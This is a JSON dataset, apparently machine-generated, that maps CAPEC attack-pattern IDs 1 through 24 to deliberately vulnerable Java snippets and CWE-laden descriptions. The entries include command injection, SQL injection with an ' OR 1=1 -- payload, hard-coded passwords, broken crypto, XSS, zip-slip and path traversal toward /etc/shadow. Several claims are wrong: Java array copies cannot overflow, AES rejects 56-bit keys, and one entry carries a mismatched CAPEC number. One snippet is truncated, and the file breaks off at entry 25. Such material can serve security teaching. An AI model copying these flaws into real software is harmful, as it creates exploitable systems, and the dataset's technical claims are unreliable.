[
    {
        "capec_id": "1",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class InsecureAuthorization {\n    public static void main(String[] args) {\n        // CWE-276: Incorrect Default Permissions\n        File file = new File(\"/path/to/file\");\n        file.setReadable(true, false);\n        file.setWritable(true, false);\n\n        // CWE-285: Improper Authorization\n        List<String> acl = new ArrayList<>();\n        acl.add(\"admin\");\n        if (!acl.contains(\"user\")) {\n            // allow access without proper authorization\n            System.out.println(\"Access granted without proper authorization\");\n        }\n\n        // CWE-434: Unrestricted Upload of File with Dangerous Type\n        String uploadDir = \"/path/to/upload/directory\";\n        File uploadFile = new File(uploadDir, \"maliciousFile.php\");\n        try {\n            uploadFile.createNewFile();\n        } catch (IOException e) {\n            System.out.println(\"Error uploading file\");\n        }\n\n        // CWE-693: Protection Mechanism Failure\n        // CWE-732: Incorrect Permission Assignment for Critical Resource\n        // CWE-1220: Insufficient Granularity of Access Control\n        // ... and other CWEs\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC 'Insufficient Access Control' by showcasing various CWEs related to improper authorization, incorrect permissions, and unrestricted access. The code allows anyone to modify files, grants access without proper authorization, and enables the upload of malicious files. It also highlights the failure of protection mechanisms and insufficient granularity of access control."
    },
    {
        "capec_id": "2",
        "code_snippet": "public class AuthenticationSystem {\n    private int maxAttempts = 3;\n    private Map<String, Integer> loginAttempts = new HashMap<>();\n\n    public boolean authenticate(String username, String password) {\n        if (loginAttempts.containsKey(username)) {\n            int attempts = loginAttempts.get(username);\n            if (attempts >= maxAttempts) {\n                System.out.println(\\",
        "description": "This Java code snippet demonstrates a vulnerable authentication system that can be exploited by an attacker to launch a denial of service attack against a legitimate system user. The system has an overly restrictive account lockout mechanism (CWE-645) that locks an account after a certain number of incorrect login attempts. The system also has weak password requirements (CWE-521), allowing easily guessable passwords. Additionally, the system does not implement sufficient measures to prevent multiple failed authentication attempts within a short time frame (CWE-307), making it susceptible to brute force attacks. Furthermore, the authentication mechanism can be bypassed due to a separate weakness (CWE-305), and the system uses a weak authentication mechanism that does not sufficiently prove the claimed identity (CWE-1390)."
    },
    {
        "capec_id": "3",
        "code_snippet": "public class VulnerableAPI {\n    public static void processInput(String input) {\n        // CWE-173: Improper Handling of Alternate Encoding\n        String decodedInput = URLDecoder.decode(input, \"UTF-8\");\n        \n        // CWE-41: Improper Resolution of Path Equivalence\n        String filePath = \"/path/to/file/\" + decodedInput;\n        \n        // CWE-172: Encoding Error\n        byte[] fileBytes = filePath.getBytes(\"ISO-8859-1\");\n        \n        // CWE-179: Incorrect Behavior Order: Early Validation\n        if (isValidInput(decodedInput)) {\n            // CWE-180: Incorrect Behavior Order: Validate Before Canonicalize\n            String canonicalizedInput = canonicalizeInput(decodedInput);\n            \n            // CWE-181: Incorrect Behavior Order: Validate Before Filter\n            String filteredInput = filterInput(canonicalizedInput);\n            \n            // CWE-183: Permissive List of Allowed Inputs\n            if (isAllowedInput(filteredInput)) {\n                // CWE-184: Incomplete List of Disallowed Inputs\n                processFile(fileBytes);\n            }\n        }\n    }\n    \n    private static boolean isValidInput(String input) {\n        // CWE-20: Improper Input Validation\n        return input.matches(\"^[a-zA-Z0-9]+$\");\n    }\n    \n    private static String canonicalizeInput(String input) {\n        // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n        return input.replace(\"../\", \"\");\n    }\n    \n    private static String filterInput(String input) {\n        // CWE-697: Incorrect Comparison\n        if (input.equals(\"some_invalid_input\")) {\n            return \"some_default_value\";\n        }\n        return input;\n    }\n    \n    private static void processFile(byte[] fileBytes) {\n        // CWE-707: Improper Neutralization\n        try {\n            Files.write(Paths.get(\"/path/to/output/file\"), fileBytes);\n        } catch (IOException e) {\n            // handle exception\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable API that is susceptible to the CAPEC described. The API processes user input without properly handling alternate encoding, path equivalence, and encoding errors. It also has incorrect behavior orders, permissive lists of allowed inputs, and incomplete lists of disallowed inputs. The code snippet includes multiple CWEs that contribute to the vulnerability, making it possible for an adversary to bypass input validation and inject malicious data."
    },
    {
        "capec_id": "4",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class VulnerableIPAuthenticator {\n    public boolean authenticate(String ip) {\n        String[] trustedIps = {\"192.168.1.1\", \"::1\"};\n        for (String trustedIp : trustedIps) {\n            if (ip.equals(trustedIp)) {\n                return true;\n            }\n        }\n        try {\n            InetAddress addr = InetAddress.getByName(ip);\n            String hostname = addr.getHostName();\n            if (hostname.equals(\"localhost\")) {\n                return true;\n            }\n        } catch (UnknownHostException e) {\n            // ignore\n        }\n        return false;\n    }\n\n    public static void main(String[] args) {\n        VulnerableIPAuthenticator authenticator = new VulnerableIPAuthenticator();\n        System.out.println(authenticator.authenticate(\"010.000.000.001\")); // Octal encoding\n        System.out.println(authenticator.authenticate(\"0x7f000001\")); // Hex encoding\n        System.out.println(authenticator.authenticate(\"0177.000.000.001\")); // Dotted octal encoding\n        System.out.println(authenticator.authenticate(\"[::1]:80\")); // IPv6 with port\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable IP authenticator that relies on IP addresses for authentication. It does not properly handle alternate encodings of IP addresses, such as octal, hex, or dotted octal, which can be used to bypass access control. The authenticator also performs reverse DNS resolution, which can be exploited if an attacker controls the DNS server. The main method tests the authenticator with different IP address formats, including some that may be used in an attack."
    },
    {
        "capec_id": "5",
        "code_snippet": "import java.io.IOException;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class BlueBoxing {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"telco-switch.com\", 1234);\n            // CWE-285: Improper Authorization\n            // No authentication or authorization check is performed\n            socket.getOutputStream().write(\"supervisor_signal_tone\".getBytes());\n            // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n            // No verification of the endpoint is performed\n            socket.getOutputStream().write(\"reroute_command\".getBytes());\n            // CWE-940: Improper Verification of Source of a Communication Channel\n            // No verification of the source of the communication channel is performed\n            socket.getOutputStream().write(\"usurp_command\".getBytes());\n            // CWE-294: Authentication Bypass by Capture-replay\n            // No protection against capture-replay attacks is implemented\n            byte[] capturedMessage = new byte[1024];\n            socket.getInputStream().read(capturedMessage);\n            socket.getOutputStream().write(capturedMessage);\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n            // No message integrity check is performed during transmission\n            byte[] receivedMessage = new byte[1024];\n            socket.getInputStream().read(receivedMessage);\n            System.out.println(new String(receivedMessage));\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host\");\n        } catch (IOException e) {\n            System.err.println(\"I/O error\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the Blue Boxing attack, which exploits weaknesses in older telephone switches and trunks. The code establishes a socket connection to a telco switch and sends a supervisor signal tone to impersonate an administrative function. The code then sends commands to reroute or usurp control of the line without performing proper authentication, authorization, or verification of the communication channel or message integrity. This code embodies the CWEs related to the CAPEC, including improper authorization, improper restriction of communication channels, improper verification of source, authentication bypass by capture-replay, and improper enforcement of message integrity during transmission."
    },
    {
        "capec_id": "6",
        "code_snippet": "public class VulnerableCode {\n    public void executeCommand(String userInput) {\n        String command = \"ping \" + userInput;\n        try {\n            Runtime.getRuntime().exec(command);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void processData(String data) {\n        String[] parts = data.split(\";\");\n        for (String part : parts) {\n            System.out.println(part);\n        }\n    }\n\n    public void filterInput(String input) {\n        if (!input.contains(\"<\") && !input.contains(\">\")) {\n            System.out.println(input);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of injecting data or command syntax through non-validated and non-filtered arguments of exposed services or methods. The executeCommand method is vulnerable to OS command injection (CWE-78), as it constructs an OS command using user input without proper neutralization. The processData method is vulnerable to improper neutralization of expression/command delimiters (CWE-146), as it splits the input data using a semicolon delimiter without validating the input. The filterInput method is vulnerable to incomplete list of disallowed inputs (CWE-184), as it only checks for '<' and '>' characters, allowing other malicious inputs to pass through."
    },
    {
        "capec_id": "7",
        "code_snippet": "public class BlindSQLInjection {\n    public static void main(String[] args) {\n        String userInput = \"' OR 1=1 --\";\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n        try {\n            Statement stmt = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"root\", \"password\").createStatement();\n            stmt.executeQuery(query);\n            System.out.println(\"Query executed successfully\");\n        } catch (SQLException e) {\n            // Suppressing error message\n            System.out.println(\"Error occurred\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates Blind SQL Injection (CAPEC-66) by constructing an SQL query using user input without proper validation or neutralization of special elements (CWE-89, CWE-20). The code suppresses error messages (CWE-209), making it difficult to detect the injection. An attacker can use this vulnerability to iteratively probe the target and determine the structure and syntax of the injection. The code also lacks proper input validation (CWE-20) and neutralization of special elements (CWE-74, CWE-707), making it vulnerable to injection attacks."
    },
    {
        "capec_id": "8",
        "code_snippet": "public class VulnerableLibrary {\n    public void processInput(String input) {\n        byte[] buffer = new byte[1024];\n        System.arraycopy(input.getBytes(), 0, buffer, 0, input.length());\n        // No validation of input length, leading to buffer overflow (CWE-120)\n        String processedInput = new String(buffer);\n        // Incorrect comparison (CWE-697)\n        if (processedInput.equals(\"expectedInput\")) {\n            // Improper input validation (CWE-20)\n            executeCommand(processedInput);\n        }\n    }\n\n    private void executeCommand(String input) {\n        // Improper neutralization of special elements (CWE-74)\n        String command = \"echo \" + input + \" > output.txt\";\n        Runtime.getRuntime().exec(command);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable library that is susceptible to buffer overflow attacks. The processInput method copies user input into a fixed-size buffer without validating the input length, leading to a buffer overflow (CWE-120). The method also performs an incorrect comparison (CWE-697) and improper input validation (CWE-20). The executeCommand method constructs a command using user input without neutralizing special elements, leading to an injection vulnerability (CWE-74)."
    },
    {
        "capec_id": "9",
        "code_snippet": "public class PrivilegeEscalation {\n    public static void main(String[] args) {\n        String userInput = \"-h\";\n        byte[] buffer = new byte[10];\n        System.arraycopy(userInput.getBytes(), 0, buffer, 0, userInput.length());\n        String command = \"\";\n        for (int i = 0; i < buffer.length; i++) {\n            command += (char) buffer[i];\n        }\n        Runtime.getRuntime().exec(command);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a privilege escalation vulnerability through command-line utility exploitation. It uses CWE-120 (Buffer Copy without Checking Size of Input) by copying user input into a fixed-size buffer without checking the input size, leading to a buffer overflow. CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component) is also involved, as the input is used to construct a command that is executed by the Runtime.getRuntime().exec() method without proper validation. CWE-20 (Improper Input Validation) is also applicable, as the user input is not validated before being used to construct the command. This code can be used as a starting point to demonstrate the CAPEC attack, where an adversary can leverage this vulnerability to escalate privilege to root."
    },
    {
        "capec_id": "10",
        "code_snippet": "public class EnvironmentVariableBufferOverflow {\n    public static void main(String[] args) {\n        String envVar = System.getenv(\"MY_VAR\");\n        if (envVar != null) {\n            char[] buffer = new char[10];\n            envVar.getChars(0, envVar.length(), buffer, 0);\n            System.out.println(buffer);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability through manipulation of environment variables. The code retrieves the value of an environment variable 'MY_VAR' and copies it to a fixed-size character array without checking the size of the input, leading to a classic buffer overflow (CWE-120). The code also assumes that the environment variable is immutable, which can be bypassed by an attacker (CWE-302). Additionally, the code does not restrict operations within the boundaries of the resource (CWE-118, CWE-119), and does not neutralize special elements in the input (CWE-74). The code also lacks proper input validation (CWE-20) and is vulnerable to integer overflow to buffer overflow (CWE-680) and incorrect comparison (CWE-697). A compiler optimization issue (CWE-733) may also exacerbate the vulnerability."
    },
    {
        "capec_id": "11",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String filename = req.getParameter(\"filename\");\n        File file = new File(\"/uploads/\" + filename);\n        if (filename.endsWith(\".txt\")) {\n            // Process as text file\n            resp.setContentType(\"text/plain\");\n            resp.getWriter().write(\"File uploaded successfully!\");\n        } else if (filename.endsWith(\".jpg\")) {\n            // Process as image file\n            resp.setContentType(\"image/jpeg\");\n            resp.getWriter().write(\"File uploaded successfully!\");\n        } else {\n            // Process as unknown file type\n            resp.setContentType(\"application/octet-stream\");\n            resp.getWriter().write(\"File uploaded successfully!\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that relies on the file name or extension of an uploaded file to determine the appropriate behavior. An attacker can exploit this by uploading a file with a malicious extension, causing the server to misclassify the file and process it in an unexpected way. This can lead to unexpected actions, resource exhaustion, or even remote code execution."
    },
    {
        "capec_id": "12",
        "code_snippet": "public class MulticastMessageHandler {\n    private String clientId;\n    private String privilegedId;\n    private MulticastSocket socket;\n\n    public MulticastMessageHandler(String clientId, String privilegedId) {\n        this.clientId = clientId;\n        this.privilegedId = privilegedId;\n        this.socket = new MulticastSocket(4444);\n    }\n\n    public void sendMessage(String message) {\n        // CWE-201: Insertion of Sensitive Information Into Sent Data\n        String sensitiveData = \"privilegedInfo=\" + privilegedId;\n        message += \"&\" + sensitiveData;\n        byte[] buffer = message.getBytes();\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, InetAddress.getByName(\"224.0.0.1\"), 4444);\n        socket.send(packet);\n    }\n\n    public void receiveMessage() {\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        String message = new String(packet.getData(), 0, packet.getLength());\n\n        // CWE-306: Missing Authentication for Critical Function\n        // No authentication performed before processing the message\n        processMessage(message);\n    }\n\n    private void processMessage(String message) {\n        // CWE-1292: Incorrect Conversion of Security Identifiers\n        // Incorrect conversion of security identifiers\n        String clientIdFromMessage = extractClientIdFromMessage(message);\n        if (clientIdFromMessage.equals(privilegedId)) {\n            // Grant privileged access\n            System.out.println(\"Granted privileged access to \" + clientIdFromMessage);\n        }\n    }\n\n    private String extractClientIdFromMessage(String message) {\n        // CWE-1290: Incorrect Decoding of Security Identifiers\n        // Incorrect decoding of security identifiers\n        return message.split(\"=\")[1];\n    }\n\n    public static void main(String[] args) {\n        MulticastMessageHandler handler = new MulticastMessageHandler(\"client1\", \"admin\");\n        handler.sendMessage(\"Hello from client1\");\n        handler.receiveMessage();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable multicast message handler that allows an adversary to gain access to potentially privileged information and impersonate a client. The code transmits sensitive information (CWE-201) without proper authentication (CWE-306) and uses incorrect conversion (CWE-1292) and decoding (CWE-1290) of security identifiers, allowing an attacker to manipulate the message and gain unauthorized access. The code also fails to ensure the integrity of the message during transmission (CWE-924)."
    },
    {
        "capec_id": "13",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String userInput = System.getProperty(\"user.input\"); // CWE-20: Improper Input Validation\n        String filePath = userInput + \".txt\";\n        File file = new File(filePath);\n        if (file.exists()) {\n            Properties prop = new Properties();\n            try {\n                prop.load(new java.io.FileInputStream(file));\n                String dbUsername = prop.getProperty(\"db.username\");\n                String dbPassword = prop.getProperty(\"db.password\");\n                // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n                System.out.println(\"Database credentials: \" + dbUsername + \"/\" + dbPassword);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of modifying environment variables to deviate from expected operation. The code uses a user-input controlled environment variable to construct a file path, which can lead to CWE-73: External Control of File Name or Path. The code then loads a properties file from the constructed path, exposing sensitive database credentials to an unauthorized actor (CWE-200). The code also lacks input validation (CWE-20) and authorization checks (CWE-285), making it vulnerable to further exploitation."
    },
    {
        "capec_id": "14",
        "code_snippet": "public class VulnerableService {\n    public void serveContent(byte[] content) {\n        byte[] buffer = new byte[1024];\n        int bytesRead = 0;\n        while (bytesRead < content.length) {\n            bytesRead += readFromNetwork(content, bytesRead, buffer);\n        }\n        processContent(buffer);\n    }\n\n    private int readFromNetwork(byte[] content, int offset, byte[] buffer) {\n        int bytesRead = 0;\n        while (bytesRead < buffer.length) {\n            int bytesReadThisIteration = networkRead(content, offset + bytesRead, buffer, bytesRead);\n            if (bytesReadThisIteration < 0) {\n                break;\n            }\n            bytesRead += bytesReadThisIteration;\n        }\n        return bytesRead;\n    }\n\n    private int networkRead(byte[] content, int offset, byte[] buffer, int bytesRead) {\n        // No input validation or integrity check\n        return content[offset] + bytesRead;\n    }\n\n    private void processContent(byte[] buffer) {\n        // No restriction on operations within the boundaries of the buffer\n        for (int i = 0; i < buffer.length * 2; i++) {\n            System.out.print((char) buffer[i]);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable service that is susceptible to a buffer overflow attack. The 'serveContent' method reads data from the network into a fixed-size buffer without checking the size of the input, leading to a classic buffer overflow (CWE-120). The 'networkRead' method lacks input validation (CWE-20) and integrity checks (CWE-353), allowing an attacker to inject malicious content. The 'processContent' method performs operations outside the boundaries of the buffer (CWE-119), which can lead to a range error (CWE-118). The code also lacks proper neutralization of special elements (CWE-74) and is vulnerable to integer overflow to buffer overflow (CWE-680) and incorrect comparison (CWE-697)."
    },
    {
        "capec_id": "15",
        "code_snippet": "public class VulnerableCommandExecutor {\n    public void executeCommand(String userInput) {\n        String command = \"cat \" + userInput + \" > output.txt\";\n        try {\n            Runtime.getRuntime().exec(command);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    public static void main(String[] args) {\n        VulnerableCommandExecutor executor = new VulnerableCommandExecutor();\n        executor.executeCommand(args[0]);\n    }\n}",
        "description": "This Java code snippet demonstrates command injection vulnerability. The 'executeCommand' method takes user input and concatenates it with a legitimate command. The 'Runtime.getRuntime().exec(command)' call executes the concatenated command, allowing an attacker to inject malicious commands. The code is vulnerable to CWE-77 (Improper Neutralization of Special Elements used in a Command), CWE-78 (Improper Neutralization of Special Elements used in an OS Command), CWE-140 (Improper Neutralization of Delimiters), and CWE-146 (Improper Neutralization of Expression/Command Delimiters)."
    },
    {
        "capec_id": "16",
        "code_snippet": "public class DictionaryAttack {\n    private static final String[] dictionary = {\"password123\", \"iloveyou\", \"dragonball\"};\n    private static final String username = \"admin\";\n\n    public static void main(String[] args) {\n        for (String password : dictionary) {\n            if (authenticate(username, password)) {\n                System.out.println(\"Access granted with password: \" + password);\n                return;\n            }\n        }\n        System.out.println(\"Access denied\");\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // No password aging mechanism in place\n        // No restriction on excessive authentication attempts\n        // Single-factor authentication using passwords only\n        // Weak password requirements (no complexity or length checks)\n        return username.equals(\"admin\") && password.equals(getStoredPasswordForUser(username));\n    }\n\n    private static String getStoredPasswordForUser(String username) {\n        // Hardcoded password for admin user\n        return \"dragonball\";\n    }\n}",
        "description": "This Java code snippet demonstrates a dictionary attack vulnerability, where an attacker tries each word in a dictionary as passwords to gain access to the system via an admin user's account. The code lacks password aging, has no restriction on excessive authentication attempts, uses single-factor authentication, and has weak password requirements, making it susceptible to brute force attacks."
    },
    {
        "capec_id": "17",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.io.FileWriter;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // CWE-732: Incorrect Permission Assignment for Critical Resource\n            File file = new File(\"/tmp/evil_file\");\n            if (!file.exists()) {\n                file.createNewFile();\n            }\n            // CWE-285: Improper Authorization\n            if (System.getProperty(\"user.name\").equals(\"admin\")) {\n                // CWE-272: Least Privilege Violation\n                Runtime.getRuntime().exec(\"chmod 777 \" + file.getAbsolutePath());\n            }\n            // CWE-59: Improper Link Resolution Before File Access ('Link Following')\n            File link = new File(\"/tmp/link\");\n            link.createNewFile();\n            FileWriter writer = new FileWriter(link);\n            writer.write(\"../../etc/shadow\");\n            writer.close();\n            // CWE-282: Improper Ownership Management\n            Runtime.getRuntime().exec(\"chown nobody:nobody \" + link.getAbsolutePath());\n            // CWE-270: Privilege Context Switching Error\n            Runtime.getRuntime().exec(\"setuid 0\");\n            // CWE-693: Protection Mechanism Failure\n            System.setSecurityManager(null);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable code that allows an adversary to upload and execute a file, exploiting incorrect permission assignments, improper authorization, least privilege violations, improper link resolution, improper ownership management, privilege context switching errors, and protection mechanism failures."
    },
    {
        "capec_id": "18",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String userInput = req.getParameter(\"userInput\");\n        String html = \"<img src='\" + userInput + \"' alt='user input'>\";\n        resp.setContentType(\"text/html\");\n        PrintWriter out = resp.getWriter();\n        out.println(\"<html><body>\" + html + \"</body></html>\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to a stored XSS attack. The servlet takes user input from a GET request parameter and embeds it in an HTML image tag without proper validation or encoding, allowing an attacker to inject malicious scripts. This code embodies the main idea of the CAPEC, which involves exploiting improper neutralization of script-related HTML tags, as described in CWEs 80, 82, and 79."
    },
    {
        "capec_id": "19",
        "code_snippet": "import javax.script.ScriptEngineManager;\nimport javax.script.ScriptEngine;\nimport javax.script.ScriptException;\n\npublic class VulnerableCode {\n    public static void executeScript(String script) throws ScriptException {\n        ScriptEngineManager manager = new ScriptEngineManager();\n        ScriptEngine engine = manager.getEngineByName(\"javascript\");\n        engine.eval(script);\n    }\n\n    public static void main(String[] args) throws ScriptException {\n        String userInput = \"<script>alert('XSS')</script>\";\n        executeScript(userInput);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of executing malicious scripts by allowing remote hosts to execute scripts due to improper access control, cross-site scripting, and inclusion of web functionality from an untrusted source. The code uses the JavaScript engine to execute user-input scripts, which can lead to unintended reentrant invocation of non-reentrant code and embedded malicious code. The main method takes user input and executes it as a script, allowing an attacker to inject malicious code."
    },
    {
        "capec_id": "20",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.SecureRandom;\n\npublic class InsecureEncryption {\n    public static void main(String[] args) throws Exception {\n        // CWE-326: Inadequate Encryption Strength\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"AES\");\n        keyGen.init(56); // 56-bit key is too short\n        SecretKey key = keyGen.generateKey();\n\n        // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n        Cipher cipher = Cipher.getInstance(\"AES/ECB/NoPadding\");\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n\n        // CWE-693: Protection Mechanism Failure\n        // No authentication or integrity check\n        byte[] plaintext = \"secret message\".getBytes();\n        byte[] ciphertext = cipher.doFinal(plaintext);\n\n        // CWE-1204: Generation of Weak Initialization Vector (IV)\n        // Using a fixed IV\n        byte[] iv = new byte[16];\n        cipher.init(Cipher.DECRYPT_MODE, key, new javax.crypto.spec.IvParameterSpec(iv));\n        byte[] decrypted = cipher.doFinal(ciphertext);\n\n        // CWE-321: Use of Hard-coded Cryptographic Key\n        // Hard-coded key\n        byte[] hardcodedKey = new byte[] { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16 };\n        SecretKey hardcodedSecretKey = new javax.crypto.spec.SecretKeySpec(hardcodedKey, \"AES\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of an attacker performing an exhaustive search on the key space to determine the key that decrypts the cipher text. It incorporates multiple CWEs, including inadequate encryption strength, use of a broken or risky cryptographic algorithm, protection mechanism failure, generation of weak initialization vector, and use of hard-coded cryptographic key."
    },
    {
        "capec_id": "21",
        "code_snippet": "import javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        Cookie[] cookies = req.getCookies();\n        String sessionId = \"\";\n        for (Cookie cookie : cookies) {\n            if (cookie.getName().equals(\"JSESSIONID\")) {\n                sessionId = cookie.getValue();\n                break;\n            }\n        }\n        // No validation of the session ID\n        if (!sessionId.isEmpty()) {\n            // Assume the user is authenticated\n            resp.getWriter().println(\"Welcome, authenticated user!\");\n        } else {\n            resp.getWriter().println(\"Please authenticate.\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to authentication bypass by spoofing attacks. The servlet retrieves a JSESSIONID cookie from the request and assumes the user is authenticated if the cookie is present, without validating the session ID. This allows an attacker to bypass authentication by providing a spoofed JSESSIONID cookie. The code relates to CWEs 290, 302, 346, 539, 6, 384, 664, 602, and 642."
    },
    {
        "capec_id": "22",
        "code_snippet": "public class AuthenticationServer {\n    private static Map<String, String> users = new HashMap<>();\n    public AuthenticationServer() {\n        users.put(\"admin\", \"password\");\n    }\n    public boolean authenticate(String username, String password) {\n        if (users.containsKey(username) && users.get(username).equals(password)) {\n            return true;\n        }\n        return false;\n    }\n    public void processRequest(String username, String request) {\n        if (authenticate(username, \"\")) {\n            // Process the request without verifying the password\n            System.out.println(\"Request processed: \" + request);\n        }\n    }\n    public static void main(String[] args) {\n        AuthenticationServer server = new AuthenticationServer();\n        server.processRequest(\"admin\", \"malicious request\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable authentication server that is susceptible to authentication bypass by spoofing attacks (CWE-290). The server stores usernames and passwords in a HashMap, but the authenticate method can be bypassed by passing an empty password (CWE-20). The processRequest method trusts the username without verifying the password, allowing an attacker to impersonate a valid user (CWE-287). The server also exposes sensitive information (CWE-200) and lacks a proper protection mechanism (CWE-693), making it vulnerable to directed attacks."
    },
    {
        "capec_id": "23",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.util.zip.ZipEntry;\nimport java.util.zip.ZipInputStream;\n\npublic class FileUploadVulnerability {\n    public static void uploadFile(String filePath) throws IOException {\n        File file = new File(filePath);\n        if (file.getName().endsWith(\".zip\")) {\n            unzipFile(file);\n        } else {\n            // No validation or restriction on file type\n            File uploadedFile = new File(\"/uploads/\" + file.getName());\n            FileInputStream fis = new FileInputStream(file);\n            FileOutputStream fos = new FileOutputStream(uploadedFile);\n            byte[] buffer = new byte[1024];\n            int len;\n            while ((len = fis.read(buffer)) > 0) {\n                fos.write(buffer, 0, len);\n            }\n            fis.close();\n            fos.close();\n        }\n    }\n\n    public static void unzipFile(File zipFile) throws IOException {\n        ZipInputStream zis = new ZipInputStream(new FileInputStream(zipFile));\n        ZipEntry ze;\n        while ((ze = zis.getNextEntry()) != null) {\n            File unzippedFile = new File(\"/uploads/\" + ze.getName());\n            FileOutputStream fos = new FileOutputStream(unzippedFile);\n            byte[] buffer = new byte[1024];\n            int len;\n            while ((len = zis.read(buffer)) > 0) {\n                fos.write(buffer, 0, len);\n            }\n            fos.close();\n        }\n        zis.close();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a file upload vulnerability that can be exploited by an adversary to poison files with malicious payloads. The code lacks proper input validation, allowing an attacker to upload files of any type, including dangerous types. The code also relies on the file name or extension to determine the appropriate behavior, making it vulnerable to misclassification. Additionally, the code stores raw content under the web document root with an extension that is not specifically handled by the server, making it vulnerable to unparsed raw web content delivery. The code also contains embedded malicious code, making it vulnerable to exploitation."
    },
    {
        "capec_id": "24",
        "code_snippet": "public class VulnerableFilter {\n    public static void filterInput(String userInput) {\n        byte[] buffer = new byte[1024];\n        System.arraycopy(userInput.getBytes(), 0, buffer, 0, userInput.length());\n        // No validation of userInput length before copying to buffer\n        // CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')\n        // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n        // CWE-118: Incorrect Access of Indexable Resource ('Range Error')\n        String filteredInput = new String(buffer);\n        // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n        // CWE-20: Improper Input Validation\n        System.out.println(\"Filtered Input: \" + filteredInput);\n    }\n    public static void main(String[] args) {\n        String userInput = \"\";\n        for (int i = 0; i < 2048; i++) {\n            userInput += \"A\";\n        }\n        filterInput(userInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable filter that can be exploited by an attacker to cause a buffer overflow. The filterInput method copies user input into a fixed-size buffer without validating the input length, leading to a buffer overflow. The main method generates an oversized input string to demonstrate the vulnerability."
    },
    {
        "capec_id": "25",
